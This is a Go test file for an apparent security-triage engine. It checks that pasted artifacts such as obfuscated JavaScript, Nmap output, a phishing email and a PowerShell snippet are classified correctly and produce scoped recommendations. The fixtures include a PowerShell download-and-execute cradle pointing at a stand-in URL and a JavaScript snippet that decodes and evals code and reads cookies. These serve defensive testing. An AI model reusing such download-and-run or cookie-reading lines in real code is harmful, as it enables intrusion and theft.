package engine

import (
	"strings"
	"testing"

	"github.com/grcheulishvili/advsec/pkg/osdetect"
	"github.com/grcheulishvili/advsec/pkg/plugin"
)

// sandboxHost is a deterministic host for end-to-end rendering assertions.
func sandboxHost() osdetect.HostInfo {
	return osdetect.HostInfo{
		Family:  osdetect.FamilyDebian,
		Manager: osdetect.PackageManager{Name: "apt", InstallTemplate: "sudo apt install -y %s"},
	}
}

// runSandbox runs the full pipeline (classify -> format-scope -> match ->
// evaluate) the way the CLI does, and returns the rendered report.
func runSandbox(t *testing.T, raw string) (*Context, *Report) {
	t.Helper()
	res := plugin.LoadFromDirs([]string{"../../plugins"})
	if len(res.Plugins) == 0 {
		t.Fatal("no bundled plugins loaded")
	}
	ctx := ParseString(raw)
	scoped := FilterByFormat(res.Plugins, ctx.Format)
	matches := NewMatcher(scoped).Evaluate(ctx)
	// Apply the default confidence gate, as the CLI does.
	kept := matches[:0]
	for _, m := range matches {
		if m.Confidence >= DefaultMinConfidence {
			kept = append(kept, m)
		}
	}
	report := NewEvaluator(sandboxHost()).Evaluate(ctx, kept)
	return ctx, report
}

func domainsOf(r *Report) map[string]bool {
	d := map[string]bool{}
	for _, rec := range r.Recommendations {
		d[rec.Domain] = true
	}
	return d
}

// 1. Obfuscated JavaScript payload.
func TestSandbox_ObfuscatedJS(t *testing.T) {
	js := `(function(_0x4a2b){var _0x1=['log','cookie'];window[_0x1[0]];eval(atob('ZG9j'));document.cookie;})(window);`
	ctx, report := runSandbox(t, js)
	if ctx.Format != FormatJavaScript {
		t.Fatalf("format = %q, want code/javascript", ctx.Format)
	}
	doms := domainsOf(report)
	for _, bad := range []string{"network", "redteam", "cloud", "wireless"} {
		if doms[bad] {
			t.Errorf("JS payload surfaced suppressed domain %q", bad)
		}
	}
	if len(report.Recommendations) == 0 {
		t.Fatal("expected js recommendations, got none")
	}
	for _, rec := range report.Recommendations {
		if rec.Domain != "js" && rec.Domain != "web" && rec.Domain != "crypto" {
			t.Errorf("JS payload routed to unexpected domain %q (rule %q)", rec.Domain, rec.PluginID)
		}
	}
}

// 2. Nmap multi-host output: vendor link ignored, placeholders resolved.
func TestSandbox_NmapTargets(t *testing.T) {
	nmap := "Starting Nmap 7.94 ( https://nmap.org )\n" +
		"Nmap scan report for shop.victim.test (203.0.113.10)\n" +
		"Host is up (0.011s latency).\n" +
		"PORT   STATE SERVICE\n80/tcp open  http\n443/tcp open https\n"
	ctx, report := runSandbox(t, nmap)
	if ctx.Format != FormatNmap {
		t.Fatalf("format = %q, want network/nmap", ctx.Format)
	}
	for _, d := range ctx.Entities[EntityDomain] {
		if d == "nmap.org" {
			t.Fatal("vendor link nmap.org was not ignored")
		}
	}
	if ctx.First(EntityIP) != "203.0.113.10" {
		t.Fatalf("target IP = %q, want 203.0.113.10", ctx.First(EntityIP))
	}
	if ctx.First(EntityDomain) != "shop.victim.test" {
		t.Fatalf("target domain = %q, want shop.victim.test", ctx.First(EntityDomain))
	}
	// Across every rendered command: target placeholders resolved to real values.
	sawIP := false
	for _, rec := range report.Recommendations {
		for _, tool := range rec.Tools {
			if strings.Contains(tool.Command, "203.0.113.10") {
				sawIP = true
			}
			assertNoRawPlaceholder(t, tool.Command, rec.PluginID)
		}
	}
	if !sawIP {
		t.Error("expected at least one command bound to the target IP")
	}
}

// 3. RFC 822 email: classified as email, offensive domains suppressed.
func TestSandbox_EmailMime(t *testing.T) {
	eml := "Received: from mx.evil.test (10.0.0.9)\r\n" +
		"From: ceo@victim.test\r\nTo: ap@victim.test\r\nSubject: Wire transfer\r\n" +
		"MIME-Version: 1.0\r\n" +
		"DKIM-Signature: v=1; a=rsa-sha256; b=aGVsbG93b3JsZDEyMzQ1Njc4OTBhYmNkZWZn\r\n" +
		"Authentication-Results: spf=fail dkim=fail dmarc=fail\r\n" +
		"Content-Disposition: attachment; name=\"invoice.docm\"\r\n\r\nbase64stuff\r\n"
	ctx, report := runSandbox(t, eml)
	if ctx.Format != FormatEmail {
		t.Fatalf("format = %q, want email/mime", ctx.Format)
	}
	doms := domainsOf(report)
	for _, bad := range []string{"network", "redteam", "cloud", "wireless", "pwn", "reversing"} {
		if doms[bad] {
			t.Errorf("email surfaced suppressed domain %q", bad)
		}
	}
	if !doms["eml"] {
		t.Error("expected eml triage rules to fire on an .eml")
	}
}

// 4. PowerShell scoping (extra coverage of the code/powershell format).
func TestSandbox_PowerShellScope(t *testing.T) {
	ps := "$env:TEMP; IEX (New-Object Net.WebClient).DownloadString('http://x'); [System.Convert]::FromBase64String($b)"
	ctx, report := runSandbox(t, ps)
	if ctx.Format != FormatPowerShell {
		t.Fatalf("format = %q, want code/powershell", ctx.Format)
	}
	doms := domainsOf(report)
	for _, bad := range []string{"web", "wireless", "cloud"} {
		if doms[bad] {
			t.Errorf("powershell surfaced suppressed domain %q", bad)
		}
	}
}

// 5. Placeholder resolution guard: no raw template token ever reaches rendered
// output, for EVERY bundled plugin, under both an empty and a populated context.
func TestSandbox_NoRawPlaceholdersLeak(t *testing.T) {
	res := plugin.LoadFromDirs([]string{"../../plugins"})
	contexts := []*Context{
		ParseString(""), // nothing extracted -> everything must fall back
		ParseString("Nmap scan report for host.test (198.51.100.7)\nvisit https://host.test/a\nhash 0ad4d7e750c2607ecc9dc4ce5f84d57bfccca1ede2756909d4933c4dab12cd34"),
	}
	for _, ctx := range contexts {
		for _, p := range res.Plugins {
			for _, tool := range p.Tactics.Tools {
				got := expandPlaceholders(tool.Command, ctx)
				assertNoRawPlaceholder(t, got, p.ID)
			}
		}
	}
}

// 6. Loopback / hex-error noise must not create targets or flip format.
func TestSandbox_NoiseSuppression(t *testing.T) {
	ctx := ParseString("bound 127.0.0.1 and ::1; install error 0x8007000D; see 10:00:30")
	if ctx.Has(EntityIP) {
		t.Errorf("loopback leaked as IP: %v", ctx.Entities[EntityIP])
	}
	if ctx.Has(EntityIPv6) {
		t.Errorf("loopback/time leaked as IPv6: %v", ctx.Entities[EntityIPv6])
	}
	if ctx.Has(EntityMemAddr) {
		t.Errorf("hex error code leaked as mem_addr: %v", ctx.Entities[EntityMemAddr])
	}
}

func assertNoRawPlaceholder(t *testing.T, cmd, ruleID string) {
	t.Helper()
	for _, tok := range []string{"{target}", "{target_ip}", "{target_domain}", "{target_url}",
		"{target_port}", "{target_hash}", "{target_addr}", "{target_cve}"} {
		if strings.Contains(cmd, tok) {
			t.Errorf("rule %q leaked raw placeholder %q in: %s", ruleID, tok, cmd)
		}
	}
}
